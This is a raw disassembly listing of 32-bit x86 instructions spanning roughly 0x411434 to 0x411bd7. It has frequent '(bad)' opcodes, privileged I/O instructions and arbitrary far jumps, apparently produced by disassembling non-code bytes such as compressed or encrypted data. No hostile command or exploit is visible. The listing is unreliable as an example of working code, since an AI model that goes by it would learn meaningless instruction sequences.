  411434:	and    eax,0x8ec41e01
  411439:	pop    ds
  41143a:	push   ebx
  41143b:	int3   
  41143c:	sbb    edx,DWORD PTR [edx]
  41143e:	aad    0x2a
  411440:	adc    DWORD PTR [ebx+0x3d],esp
  411443:	jmp    0x97fc:0xb415c2a5
  41144a:	aam    0xcc
  41144c:	(bad)  
  41144d:	sbb    ah,BYTE PTR [esi+0x627e5610]
  411453:	pop    edx
  411454:	retf   0x6d03
  411457:	(bad)  
  411458:	jp     0x41143b
  41145a:	popf   
  41145b:	or     DWORD PTR [edx],edx
  41145d:	test   eax,0x9d1dd0eb
  411462:	push   ss
  411463:	fchs   
  411465:	pop    es
  411466:	lahf   
  411467:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411468:	jbe    0x41141c
  41146a:	ins    DWORD PTR es:[edi],dx
  41146b:	int3   
  41146c:	call   0xf2dc:0x46949da9
  411473:	mov    ch,ch
  411475:	cs ja  0x41143a
  411478:	jmp    FWORD PTR [eax]
  41147a:	pop    edx
  41147b:	cmc    
  41147c:	pop    ebp
  41147d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41147e:	arpl   WORD PTR [ebx+0x37e43b5b],bp
  411484:	std    
  411485:	inc    esp
  411486:	(bad)  [edx+ecx*2-0x4c]
  41148a:	data16 mov al,0x97
  41148d:	dec    ebx
  41148e:	lods   eax,DWORD PTR ds:[esi]
  41148f:	lea    edx,[esi-0x6ef89933]
  411495:	cwde   
  411496:	push   ss
  411497:	cmc    
  411498:	hlt    
  411499:	add    BYTE PTR [ebx-0x3e],dl
  41149c:	(bad)
  4114a0:	inc    eax
  4114a1:	inc    eax
  4114a2:	out    0x6a,al
  4114a4:	loope  0x41147c
  4114a6:	sahf   
  4114a7:	sub    edx,DWORD PTR [edx+0x1b2747de]
  4114ad:	or     eax,0xdc34d787
  4114b2:	in     eax,0xce
  4114b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4114b5:	ja     0x41150c
  4114b7:	jb     0x4114e7
  4114b9:	imul   ebx,edi,0x2d598f87
  4114bf:	mov    cs,WORD PTR [ecx+0x36]
  4114c2:	jno    0x4114b9
  4114c4:	push   esi
  4114c5:	ja     0x4114f3
  4114c7:	(bad)  
  4114c8:	sbb    ch,dl
  4114ca:	into   
  4114cb:	pop    ebx
  4114cc:	retf   
  4114cd:	push   ebx
  4114ce:	xchg   ecx,eax
  4114cf:	repz inc edx
  4114d1:	jmp    0xa1e20350
  4114d6:	mov    bh,0x96
  4114d8:	and    edi,0xffffffb0
  4114db:	retf   0x3e3d
  4114de:	cld    
  4114df:	sti    
  4114e0:	push   0xffffffe4
  4114e2:	inc    ebp
  4114e3:	cdq    
  4114e4:	sub    eax,0x162bda59
  4114e9:	out    0x62,al
  4114eb:	scas   al,BYTE PTR es:[edi]
  4114ec:	cmp    BYTE PTR ds:0xc8f123b4,dh
  4114f2:	scas   al,BYTE PTR es:[edi]
  4114f3:	jnp    0x4114d8
  4114f5:	inc    esi
  4114f6:	mov    bh,0x52
  4114f8:	xor    bh,dh
  4114fa:	pop    edx
  4114fb:	(bad)  
  4114fc:	hlt    
  4114fd:	jne    0x41151f
  4114ff:	xor    eax,0xe56c0898
  411504:	pop    edi
  411505:	add    al,0x78
  411507:	mov    bl,0x9a
  411509:	jnp    0x4114ae
  41150b:	push   edi
  41150c:	arpl   WORD PTR [eax+0x2f],bp
  41150f:	add    al,0x26
  411511:	pop    edi
  411512:	aad    0x6d
  411514:	test   BYTE PTR [edi+0xe56ef0f],ah
  41151a:	sub    al,BYTE PTR [eax+0x2ec44be]
  411520:	push   edx
  411521:	fs mov bl,0x30
  411524:	stc    
  411525:	push   ebp
  411526:	push   0x4f84f35d
  41152b:	jno    0x41153e
  41152d:	sbb    DWORD PTR [ebp+0x48],ebp
  411530:	or     BYTE PTR [ebx+0x1d7ed6cd],al
  411536:	mov    al,0x5c
  411538:	adc    eax,DWORD PTR [ebx]
  41153a:	mov    edx,0x4c9ed02e
  41153f:	fld    TBYTE PTR [esi-0x65]
  411542:	and    edi,0xbf91a61a
  411548:	lods   eax,DWORD PTR ds:[esi]
  411549:	out    dx,al
  41154a:	call   0x4ed:0x191969c
  411551:	in     eax,0x9f
  411553:	push   0xffffffab
  411555:	push   es
  411556:	inc    ebp
  411557:	in     al,dx
  411558:	frstor [edx+0x228989a1]
  41155e:	in     al,dx
  41155f:	scas   eax,DWORD PTR es:[edi]
  411560:	leave  
  411561:	out    0x85,eax
  411563:	stos   BYTE PTR es:[edi],al
  411564:	push   ebp
  411565:	cdq    
  411566:	cmp    al,0x13
  411568:	mov    bh,bl
  41156a:	fisubr DWORD PTR [edi-0x6822cae5]
  411570:	adc    al,0xb6
  411572:	cmp    BYTE PTR [edx-0x6bf1b894],bl
  411578:	or     al,0x6e
  41157a:	jo     0x41150e
  41157c:	or     dl,BYTE PTR [eax+0x5eaec388]
  411582:	or     al,0x61
  411584:	shl    esi,1
  411586:	ss je  0x411528
  411589:	mov    edi,0x336865e4
  41158e:	lods   al,BYTE PTR ds:[esi]
  41158f:	sub    BYTE PTR [esi],dl
  411591:	retf   
  411592:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411593:	lods   al,BYTE PTR ds:[esi]
  411594:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411595:	shl    BYTE PTR [edx+0x1b],0x93
  411599:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41159a:	out    0x6c,al
  41159c:	jg     0x411590
  41159e:	pop    ebx
  41159f:	sbb    bh,BYTE PTR [edi]
  4115a1:	icebp  
  4115a2:	inc    eax
  4115a3:	mov    ebx,DWORD PTR ds:0x11d1e2ab
  4115a9:	(bad)  
  4115aa:	jnp    0x41157d
  4115ac:	enter  0xb30f,0xc4
  4115b0:	mov    al,0xd1
  4115b2:	jge    0x4115c5
  4115b4:	pushf  
  4115b5:	mov    edx,DWORD PTR [eax]
  4115b7:	xchg   edi,eax
  4115b8:	sbb    eax,0x57c0c58
  4115bd:	lahf   
  4115be:	adc    DWORD PTR [esi+0x5f],0xffffffd8
  4115c2:	hlt    
  4115c3:	push   eax
  4115c4:	and    ebp,DWORD PTR [eax+0x32e3d396]
  4115ca:	add    BYTE PTR ds:0xbcc1a758,al
  4115d0:	fst    QWORD PTR [ebx-0x2b46a096]
  4115d6:	inc    edx
  4115d7:	shr    DWORD PTR [ecx],0x93
  4115da:	xor    eax,0x9d98a9d5
  4115df:	scas   al,BYTE PTR es:[edi]
  4115e0:	repz sbb DWORD PTR [edi],0xa8a4b9e7
  4115e7:	fistp  QWORD PTR [edx+0x26]
  4115ea:	jmp    0x411664
  4115ec:	add    eax,0x45052830
  4115f1:	in     eax,0xb6
  4115f3:	icebp  
  4115f4:	mov    edi,0xe4f978a2
  4115f9:	and    BYTE PTR [edi+0x275bbad4],al
  4115ff:	mov    edi,0x1d686df0
  411604:	mov    al,0xb9
  411606:	mov    ebp,0xac6e55a3
  41160b:	mov    DWORD PTR [ebx+0x4c],esi
  41160e:	stos   DWORD PTR es:[edi],eax
  41160f:	jnp    0x4115eb
  411611:	xchg   ebx,eax
  411612:	mov    ecx,ebx
  411614:	arpl   WORD PTR [edx-0x6e],si
  411617:	mov    ecx,0xaae52154
  41161c:	dec    eax
  41161d:	xor    cl,ch
  41161f:	fcmovu st,st(5)
  411621:	fs pop edi
  411623:	add    BYTE PTR [edx],bl
  411625:	xchg   ecx,eax
  411626:	arpl   WORD PTR [edx],bp
  411628:	sub    BYTE PTR [eax],dh
  41162a:	push   0xc137cac4
  41162f:	inc    esi
  411630:	mov    bh,0xd7
  411632:	mov    ecx,0xcf8ea3a4
  411637:	aas    
  411638:	dec    ecx
  411639:	sti    
  41163a:	fs (bad) 
  41163c:	push   sp
  41163e:	xor    ch,BYTE PTR [eax+0x51]
  411641:	shl    eax,1
  411643:	dec    esp
  411644:	push   ebx
  411645:	dec    ebp
  411646:	lods   eax,DWORD PTR ds:[esi]
  411647:	aam    0xa7
  411649:	adc    eax,0x9902c9aa
  41164e:	push   ecx
  41164f:	push   edx
  411650:	dec    eax
  411651:	int    0x15
  411653:	mov    bl,0x6f
  411655:	call   0xbbcc1d87
  41165a:	sub    al,0xf
  41165c:	pop    ebx
  41165d:	jmp    0x4116d5
  41165f:	cld    
  411660:	out    0x6,al
  411662:	mov    ss,edi
  411664:	mov    bh,0x1b
  411666:	(bad)  
  411667:	out    dx,al
  411668:	dec    ecx
  411669:	xor    al,0xe0
  41166b:	mov    edi,0x7f715f11
  411670:	cmp    al,dl
  411672:	outs   dx,DWORD PTR ds:[esi]
  411673:	jns    0x41168a
  411675:	imul   edi,DWORD PTR [ebx],0x4c91029d
  41167b:	imul   edi,DWORD PTR [ebx-0x2862d5d5],0x5295bd82
  411685:	push   ds
  411686:	cmp    ah,BYTE PTR [esi+edx*8]
  411689:	bswap  ebx
  41168b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41168c:	mov    dh,0x7a
  41168e:	out    dx,al
  41168f:	pop    edx
  411690:	sbb    BYTE PTR [ecx],0x88
  411693:	inc    esi
  411694:	push   esi
  411695:	inc    ebp
  411696:	adc    edi,DWORD PTR [ebp-0x7568f63]
  41169c:	inc    eax
  41169d:	sub    BYTE PTR [ebx],bl
  41169f:	aam    0xaa
  4116a1:	js     0x411693
  4116a3:	out    dx,eax
  4116a4:	xlat   BYTE PTR ds:[ebx]
  4116a5:	xchg   ecx,eax
  4116a6:	xchg   ecx,eax
  4116a7:	dec    ebp
  4116a8:	neg    DWORD PTR [eax]
  4116aa:	sub    al,0x73
  4116ac:	add    edi,0xffffff83
  4116af:	loop   0x4116e6
  4116b1:	pop    ebx
  4116b2:	in     eax,0xeb
  4116b4:	inc    ebp
  4116b5:	push   0xffffff88
  4116b7:	mov    ecx,0x520ad07f
  4116bc:	sbb    al,0xab
  4116be:	pop    edx
  4116bf:	test   eax,0x7c9fc16e
  4116c4:	and    eax,0x529b83fe
  4116c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116ca:	int3   
  4116cb:	sub    al,BYTE PTR [edi-0x6d]
  4116ce:	add    cl,BYTE PTR [esi+0x67816985]
  4116d4:	mov    esi,0xc5284b
  4116d9:	loop   0x41165e
  4116db:	mov    edi,0xe278cf73
  4116e0:	repz cwde 
  4116e2:	mov    ecx,0x128b97b7
  4116e8:	(bad)  
  4116e9:	popa   
  4116ea:	xchg   ebp,eax
  4116eb:	sbb    DWORD PTR [eax],ecx
  4116ed:	push   cs
  4116ee:	jb     0x4116b5
  4116f0:	vpacksswb ymm6,ymm7,YMMWORD PTR [edi+0xa]
  4116f5:	out    0x91,al
  4116f7:	call   0xbc90:0xc9218fef
  4116fe:	retf   
  4116ff:	sar    dl,1
  411701:	lds    ebx,FWORD PTR [ebx-0x3c]
  411704:	sbb    BYTE PTR [ecx],al
  411706:	push   ecx
  411707:	and    cl,BYTE PTR [esi+ecx*4-0x1e]
  41170b:	sbb    ebp,DWORD PTR [ecx]
  41170d:	mov    edi,0x31c7439
  411712:	(bad)
  411715:	xor    ch,BYTE PTR [esi]
  411717:	pop    ss
  411718:	xlat   BYTE PTR ds:[ebx]
  411719:	mov    ah,0xfb
  41171b:	jge    0x4116f3
  41171d:	(bad)  
  41171e:	push   cs
  41171f:	lds    edi,FWORD PTR [ecx-0x40ef4a1b]
  411725:	cs dec esi
  411727:	mov    ds:0x52be26cb,al
  41172c:	retf   0x8d7
  41172f:	mov    ah,0xe9
  411731:	cmp    esi,DWORD PTR [edx-0x337b9518]
  411737:	ret    0x5aab
  41173a:	push   es
  41173b:	mov    dl,dh
  41173d:	lgs    eax,FWORD PTR [eax+0x4118baed]
  411744:	jbe    0x4117a1
  411746:	out    dx,al
  411747:	inc    esp
  411748:	ja     0x41174c
  41174a:	cwde   
  41174b:	and    eax,0xf77224ec
  411750:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411751:	int    0x19
  411753:	mov    cl,0x4c
  411755:	ss std 
  411757:	xor    ah,BYTE PTR [eax+edi*1]
  41175a:	xchg   edi,eax
  41175b:	(bad)  
  41175c:	dec    edx
  41175d:	and    BYTE PTR [ecx+eiz*2],bh
  411760:	mov    edi,0xed1f4a3b
  411765:	(bad)  
  411766:	in     eax,dx
  411767:	rcr    DWORD PTR [esi],cl
  411769:	jg     0x41174f
  41176b:	mov    eax,0x65e7dca4
  411770:	mov    ecx,0x43517f65
  411775:	clc    
  411776:	lds    edx,FWORD PTR [ecx+eiz*4+0x1e]
  41177a:	or     al,BYTE PTR [esi-0x49]
  41177d:	(bad)  
  41177e:	in     eax,dx
  41177f:	fnsave [esp+ebp*2]
  411782:	sub    BYTE PTR [eax+0x78],dl
  411785:	mov    cl,0x8f
  411787:	mov    edx,0xd45d8070
  41178c:	retf   
  41178d:	inc    ebp
  41178e:	lods   al,BYTE PTR ds:[esi]
  41178f:	or     DWORD PTR [edx],esi
  411791:	inc    edi
  411792:	popf   
  411793:	mov    ah,0x91
  411795:	(bad)  
  411797:	pop    ds
  411798:	dec    edx
  411799:	push   esp
  41179a:	test   bh,dl
  41179c:	das    
  41179d:	fld    DWORD PTR [esi]
  41179f:	push   ebx
  4117a0:	adc    BYTE PTR [edx],bh
  4117a2:	and    bl,BYTE PTR [ecx-0x44d5246c]
  4117a8:	(bad)  [edi+0x24]
  4117ab:	fidiv  DWORD PTR [ebp+0x6ce8cbd6]
  4117b1:	pop    eax
  4117b2:	popa   
  4117b3:	dec    esp
  4117b4:	pusha  
  4117b5:	test   DWORD PTR ds:0x4db44a59,ecx
  4117bb:	jae    0x4117b1
  4117bd:	pop    ebp
  4117be:	add    al,0xa
  4117c0:	push   es
  4117c1:	adc    eax,0xad93616b
  4117c6:	or     al,0x38
  4117c8:	scas   eax,DWORD PTR es:[edi]
  4117c9:	mov    al,ds:0xa06cae0
  4117ce:	cmp    esi,DWORD PTR [esi-0xee91a30]
  4117d4:	jno    0x4117b0
  4117d6:	pop    edx
  4117d7:	out    dx,al
  4117d8:	inc    edx
  4117d9:	loop   0x41181d
  4117db:	mov    edx,0x74061563
  4117e0:	scas   al,BYTE PTR es:[edi]
  4117e1:	mov    bh,0x3a
  4117e3:	fld    DWORD PTR [ebx]
  4117e5:	test   DWORD PTR [ecx-0x51],ebp
  4117e8:	inc    ebx
  4117e9:	loop   0x411810
  4117eb:	jne    0x411796
  4117ed:	xchg   ebx,eax
  4117ee:	stos   BYTE PTR es:[edi],al
  4117ef:	call   0x4dbc79fb
  4117f4:	repz scas al,BYTE PTR es:[edi]
  4117f6:	mov    ch,0x2b
  4117f8:	retf   0x3356
  4117fb:	retf   
  4117fc:	lea    esp,[ecx]
  4117fe:	icebp  
  4117ff:	and    BYTE PTR [eax],bh
  411801:	sub    BYTE PTR es:[esi+0x508c5ddf],dh
  411808:	dec    ecx
  411809:	(bad)  
  41180a:	push   edx
  41180b:	ror    BYTE PTR [eax+0x3a1309f3],0x5e
  411812:	iret   
  411813:	fstp   QWORD PTR [eax]
  411815:	out    0x2c,eax
  411817:	loop   0x41187c
  411819:	scas   al,BYTE PTR es:[edi]
  41181a:	je     0x41185d
  41181c:	nop
  41181d:	fwait
  41181e:	add    cl,BYTE PTR [eax+0x57]
  411821:	jb     0x411882
  411823:	test   DWORD PTR [ebx],ebp
  411825:	mov    eax,ds:0xbd10fa2a
  41182a:	pushf  
  41182b:	frstor [edx]
  41182d:	dec    ecx
  41182e:	add    ecx,ebp
  411830:	dec    edi
  411831:	adc    edx,DWORD PTR [ecx-0x33]
  411834:	inc    edx
  411835:	test   bh,ah
  411837:	cmp    al,0x38
  411839:	fdivr  DWORD PTR [ebp+0x1f4f6b24]
  41183f:	push   0xfffffffe
  411841:	aas    
  411842:	mov    DWORD PTR [eax-0x496ae10d],esp
  411848:	push   ds
  411849:	inc    edx
  41184a:	cli    
  41184b:	popf   
  41184c:	mov    ebx,0x9a315c8c
  411851:	rcr    ebx,0x71
  411854:	sub    cl,BYTE PTR [eax+ebx*4+0x4387b3e7]
  41185b:	mov    BYTE PTR [ebx-0x56999185],bl
  411861:	push   0x4ef6aed5
  411866:	mov    edi,0xba1ae41d
  41186b:	xchg   edi,eax
  41186c:	out    0x97,al
  41186e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41186f:	xor    eax,DWORD PTR [edi+0x5c9aecee]
  411875:	mov    esi,0x64f553ad
  41187a:	jecxz  0x411825
  41187c:	ins    DWORD PTR es:[edi],dx
  41187d:	xchg   DWORD PTR [ebx+0x5d],ebp
  411880:	add    eax,0x713d21f3
  411885:	or     eax,0x2abd72af
  41188a:	xchg   esi,eax
  41188b:	mov    ds:0x43c0392f,eax
  411890:	aaa    
  411891:	cmp    al,0x97
  411893:	mov    dh,dl
  411895:	fistp  DWORD PTR [esp+ebp*8+0x68]
  411899:	es scas eax,DWORD PTR es:[edi]
  41189b:	dec    ebx
  41189c:	push   ds
  41189d:	sub    BYTE PTR [ebx+0x34],al
  4118a0:	xlat   BYTE PTR ds:[ebx]
  4118a1:	mov    ebp,0x2411df87
  4118a6:	cmp    al,0x43
  4118a8:	dec    esp
  4118a9:	push   esi
  4118aa:	cmc    
  4118ab:	jne    0x4118a8
  4118ad:	mov    tr0,ebp
  4118b0:	jmp    0xa4e35258
  4118b5:	dec    esi
  4118b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4118b7:	adc    eax,0x4fdb7d8d
  4118bc:	cmp    al,0x38
  4118be:	dec    esi
  4118bf:	xor    bh,bl
  4118c1:	jo     0x411848
  4118c3:	sti    
  4118c4:	mov    dl,0x53
  4118c6:	mov    al,BYTE PTR [ebp+0x3c]
  4118c9:	pop    esp
  4118ca:	mov    dh,BYTE PTR [edi+eax*4-0x4df35f81]
  4118d1:	adc    al,0xba
  4118d3:	ficomp WORD PTR [eax]
  4118d5:	(bad)  
  4118d8:	sbb    eax,0x2d9eb535
  4118dd:	and    ecx,DWORD PTR [edx+0x4b65ca25]
  4118e3:	pop    es
  4118e4:	icebp  
  4118e5:	inc    ebp
  4118e6:	out    0x69,al
  4118e8:	test   eax,0x7bc0ee88
  4118ed:	test   eax,0x716c264a
  4118f2:	push   ss
  4118f3:	cmc    
  4118f4:	dec    esp
  4118f5:	inc    edi
  4118f6:	pop    edx
  4118f7:	and    ah,bl
  4118f9:	in     al,dx
  4118fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4118fb:	xchg   ecx,eax
  4118fc:	fwait
  4118fd:	(bad)  
  4118fe:	repz cmp eax,0xffffffec
  411902:	fmul   DWORD PTR [eax+ebp*8+0x2c]
  411906:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411908:	push   edx
  411909:	dec    esi
  41190a:	gs mov esp,0xfb993fb0
  411910:	push   cs
  411911:	cdq    
  411912:	push   es
  411913:	ins    BYTE PTR es:[edi],dx
  411914:	test   DWORD PTR [edx-0x71f73644],ecx
  41191a:	fisttp QWORD PTR [edx-0x72]
  41191d:	imul   eax
  41191f:	retf   0xba60
  411922:	pop    edx
  411923:	aam    0x26
  411925:	inc    ecx
  411926:	jne    0x411950
  411928:	jmp    0x44c0:0x8e72be17
  41192f:	outs   dx,BYTE PTR ds:[esi]
  411930:	xchg   ecx,eax
  411931:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411932:	jecxz  0x411907
  411934:	and    ch,al
  411936:	inc    edx
  411937:	push   ebp
  411938:	jp     0x411901
  41193a:	xchg   BYTE PTR [esi-0x3e774fbc],cl
  411940:	repnz sub BYTE PTR [ebx],ah
  411943:	add    DWORD PTR [ebp-0x481ab23b],0x42159faf
  41194d:	ds cld 
  41194f:	pop    ss
  411950:	or     BYTE PTR [ebx+0x78],dh
  411953:	dec    edi
  411954:	pop    ebp
  411955:	test   al,0x99
  411957:	aam    0xc6
  411959:	test   eax,0xf0f433db
  41195e:	(bad)  
  411960:	not    BYTE PTR [ebx+0x110c3620]
  411966:	adc    BYTE PTR [edi],dl
  411968:	jne    0x4118ec
  41196a:	data16 add bl,cl
  41196d:	loop   0x4119ae
  41196f:	ds dec edx
  411971:	jne    0x4119bd
  411973:	lds    esp,FWORD PTR [esi+0x60425bdc]
  411979:	jb     0x4119dd
  41197b:	pop    edx
  41197c:	shl    DWORD PTR [eax+edx*1-0x5f325338],cl
  411983:	jge    0x4119fd
  411985:	(bad)  
  411987:	mov    bh,0xc4
  411989:	addr16 push edi
  41198b:	mov    edx,0xe3c9e791
  411990:	and    eax,0xac6e0ecc
  411995:	push   ecx
  411996:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411997:	(bad)  
  411999:	in     al,0xf2
  41199b:	xor    DWORD PTR [esi+0x39aea753],eax
  4119a1:	xor    DWORD PTR [ecx],edi
  4119a3:	dec    ecx
  4119a4:	xchg   edi,eax
  4119a5:	ret    
  4119a6:	test   DWORD PTR [esi],0xda3d5e8b
  4119ac:	mov    ss,WORD PTR [esi-0x7427f3e8]
  4119b2:	pop    edi
  4119b3:	add    al,0x2b
  4119b5:	shl    BYTE PTR [edx-0x11],1
  4119b8:	in     al,0x1a
  4119ba:	fwait
  4119bb:	pop    ecx
  4119bc:	xchg   esi,eax
  4119bd:	pop    esi
  4119be:	gs in  eax,dx
  4119c0:	nop
  4119c1:	mov    dh,0x7e
  4119c3:	inc    ebx
  4119c4:	test   al,0xa1
  4119c6:	jo     0x411964
  4119c8:	mov    bh,0x44
  4119ca:	xor    al,0xde
  4119cc:	push   esi
  4119cd:	dec    ecx
  4119ce:	sbb    ebp,DWORD PTR [esi-0x441ac6f5]
  4119d4:	lahf   
  4119d5:	cmp    al,0x27
  4119d7:	stos   BYTE PTR es:[di],al
  4119d9:	or     BYTE PTR [edi],0x76
  4119dc:	shr    ebx,1
  4119de:	rcr    DWORD PTR [ecx+ecx*2-0xc698ca0],0xd1
  4119e6:	push   ecx
  4119e7:	ins    DWORD PTR es:[edi],dx
  4119e8:	cld    
  4119e9:	imul   ecx,DWORD PTR [eax+eax*8],0xf5caa2fb
  4119f0:	test   DWORD PTR [esp+esi*2],ebx
  4119f3:	test   DWORD PTR [edx],0x2f9432da
  4119f9:	mov    dl,0x73
  4119fb:	inc    edx
  4119fc:	mov    ds:0x6987d81,al
  411a01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a02:	xchg   ecx,eax
  411a03:	pusha  
  411a04:	and    bl,BYTE PTR [eax-0x200e6c28]
  411a0a:	xor    BYTE PTR [ebp-0x48],bl
  411a0d:	push   edi
  411a0e:	inc    ebp
  411a0f:	adc    dl,BYTE PTR [ebp+0x0]
  411a12:	xor    eax,0x1285e9dc
  411a17:	dec    ebp
  411a18:	and    ebx,DWORD PTR [edx]
  411a1a:	push   ds
  411a1b:	add    eax,0xaf1451a1
  411a20:	retf   
  411a21:	sbb    DWORD PTR [ecx-0x69],ecx
  411a24:	jb     0x411a05
  411a26:	xor    DWORD PTR [esi+0x3b],eax
  411a29:	stos   DWORD PTR es:[edi],eax
  411a2a:	jbe    0x4119b3
  411a2c:	push   ds
  411a2d:	dec    ebp
  411a2e:	rcr    DWORD PTR ds:0xe0e64a6f,1
  411a34:	ror    DWORD PTR ds:0x5cc8ad6a,0xe8
  411a3b:	in     al,dx
  411a3c:	mov    al,ds:0xd143fc04
  411a41:	jp     0x411a62
  411a43:	lock ins WORD PTR es:[edi],dx
  411a46:	xchg   edi,eax
  411a47:	add    ebx,DWORD PTR [edx+edx*1]
  411a4a:	lea    esi,[edi+eiz*8-0x53b86132]
  411a51:	and    BYTE PTR [eax],0xad
  411a54:	dec    ecx
  411a55:	fldenv [eax]
  411a57:	pop    esp
  411a58:	ficom  WORD PTR [ecx-0x55]
  411a5b:	icebp  
  411a5c:	int    0xa3
  411a5e:	mov    BYTE PTR [ebp+0x2521decf],ah
  411a64:	jg     0x411aca
  411a66:	cmp    ebx,DWORD PTR [edx-0x18]
  411a69:	or     al,0xa3
  411a6b:	xchg   ebp,eax
  411a6c:	lock loope 0x4119fb
  411a6f:	hlt    
  411a70:	and    al,0xb1
  411a72:	cmp    DWORD PTR [ebx],ecx
  411a74:	xchg   edx,eax
  411a75:	pop    ecx
  411a76:	lahf   
  411a77:	(bad)  [edx+0x68]
  411a7a:	pop    edi
  411a7b:	cwde   
  411a7c:	xchg   DWORD PTR [ecx+esi*2-0x4fd3a359],ebp
  411a83:	mov    edx,0xdd045316
  411a88:	cmp    eax,0xc1a8357b
  411a8d:	into   
  411a8e:	jno    0x411ad8
  411a90:	xor    al,0x65
  411a92:	stos   DWORD PTR es:[edi],eax
  411a93:	cs pusha 
  411a95:	ret    0x4080
  411a98:	or     al,0x6
  411a9a:	push   edi
  411a9b:	xchg   ebp,eax
  411a9c:	aam    0x5f
  411a9e:	xchg   esp,eax
  411a9f:	enter  0x5105,0xfd
  411aa3:	jno    0x411a51
  411aa5:	sbb    DWORD PTR [ebp+eiz*4+0x15],eax
  411aa9:	ins    BYTE PTR es:[edi],dx
  411aaa:	mov    bh,0x5c
  411aac:	stc    
  411aad:	inc    ebx
  411aae:	push   eax
  411aaf:	inc    edi
  411ab0:	fcomp  QWORD PTR [ebp-0x24fe3d14]
  411ab6:	ss das 
  411ab8:	loopne 0x411a3b
  411aba:	cdq    
  411abb:	push   esp
  411abc:	inc    ebp
  411abd:	test   eax,0x2494bbda
  411ac2:	pushf  
  411ac3:	cwde   
  411ac4:	mov    dl,0x4f
  411ac6:	(bad)  
  411ac8:	dec    ebx
  411ac9:	or     DWORD PTR [ecx+0x489aabae],esp
  411acf:	xor    eax,0x8ca0573b
  411ad4:	in     al,dx
  411ad5:	out    0x72,al
  411ad7:	ins    BYTE PTR es:[edi],dx
  411ad8:	mov    esi,0xa198bb82
  411add:	repz push 0xffffffdc
  411ae0:	rcl    BYTE PTR ds:0xbffcdb32,0x6f
  411ae7:	sbb    al,0x31
  411ae9:	cmp    ah,BYTE PTR fs:[edx]
  411aec:	mov    al,0xd1
  411aee:	xchg   esi,eax
  411aef:	push   ds
  411af0:	in     al,dx
  411af1:	out    0xa8,eax
  411af3:	or     eax,0xd325a10d
  411af8:	adc    BYTE PTR [eax+0x19],0x9f
  411afc:	and    al,BYTE PTR [ebx-0x3f]
  411aff:	xor    al,0x19
  411b01:	scas   al,BYTE PTR es:[edi]
  411b02:	mov    ecx,0xbde1f2ac
  411b07:	pop    ss
  411b08:	test   BYTE PTR [esp+eiz*4],0xfd
  411b0c:	jle    0x411af0
  411b0e:	dec    edi
  411b0f:	push   es
  411b10:	retf   0x2a03
  411b13:	add    DWORD PTR [eax],edi
  411b15:	outs   dx,BYTE PTR ds:[esi]
  411b16:	leave  
  411b17:	xchg   esi,eax
  411b18:	jmp    0x93cf:0x18f12cd
  411b1f:	icebp  
  411b20:	jb     0x411b2e
  411b22:	cs hlt 
  411b24:	jns    0x411b64
  411b26:	fdivrp st(1),st
  411b28:	out    dx,eax
  411b29:	pusha  
  411b2a:	scas   al,BYTE PTR es:[edi]
  411b2b:	test   eax,0x32f5bd7d
  411b30:	test   al,0x5c
  411b32:	jne    0x411af0
  411b34:	in     eax,dx
  411b35:	sbb    eax,0x4d7c6ae
  411b3a:	push   edx
  411b3b:	adc    al,0x8c
  411b3d:	inc    eax
  411b3e:	enter  0xca93,0xcd
  411b42:	add    DWORD PTR [eax-0x566abe2a],0xffffffba
  411b49:	push   ebx
  411b4a:	dec    ecx
  411b4b:	rcr    DWORD PTR [edi+0x21],1
  411b4e:	inc    ebp
  411b4f:	and    BYTE PTR [edi-0x63],ah
  411b52:	jnp    0x411b16
  411b54:	cmp    dl,ch
  411b56:	leave  
  411b57:	xchg   edi,eax
  411b58:	imul   BYTE PTR [eax-0x5869e144]
  411b5e:	jle    0x411ae1
  411b60:	imul   ecx,DWORD PTR [edx-0x6c],0xadeeb2da
  411b67:	pop    ss
  411b68:	dec    ecx
  411b69:	push   esp
  411b6a:	and    dl,0x35
  411b6d:	imul   eax,esp,0x7a4564f3
  411b73:	inc    ebx
  411b74:	mov    ah,0x62
  411b76:	sub    al,0x2d
  411b78:	scas   al,BYTE PTR es:[edi]
  411b79:	dec    BYTE PTR [edi+edi*2]
  411b7c:	sahf   
  411b7d:	sub    BYTE PTR [edi+0x3bb6a4ea],bh
  411b83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411b84:	mov    al,0x6
  411b86:	imul   esp,edx,0x7
  411b89:	iret   
  411b8a:	mov    eax,0x5f70ae2f
  411b8f:	ja     0x411b84
  411b91:	push   edx
  411b92:	ret    
  411b93:	mov    WORD PTR [esi-0x6b9d4b0f],fs
  411b99:	enter  0xbafa,0x83
  411b9d:	cmc    
  411b9e:	mov    WORD PTR [edi+eiz*2-0x24991202],cs
  411ba5:	xchg   esi,eax
  411ba6:	or     al,0xc2
  411ba8:	dec    ebx
  411ba9:	adc    al,BYTE PTR [ebx+0x6f]
  411bac:	fdiv   st,st(5)
  411bae:	or     eax,0x1597f307
  411bb3:	ins    DWORD PTR es:[edi],dx
  411bb4:	mov    BYTE PTR [ebx+0x35],bh
  411bb7:	add    edi,esp
  411bb9:	xchg   ecx,eax
  411bba:	cmc    
  411bbb:	pop    ebx
  411bbc:	xor    BYTE PTR [edi-0x13],cl
  411bbf:	ss cli 
  411bc1:	xchg   edi,eax
  411bc2:	scas   eax,DWORD PTR es:[edi]
  411bc3:	aaa    
  411bc4:	jns    0x411c14
  411bc6:	mov    esi,0xdd7b3ba2
  411bcb:	cmp    eax,0xe63001de
  411bd0:	retf   
  411bd1:	rcr    BYTE PTR [eax-0x2f359e5b],cl
  411bd7:	rcl    DWORD PTR [esi],0x5b
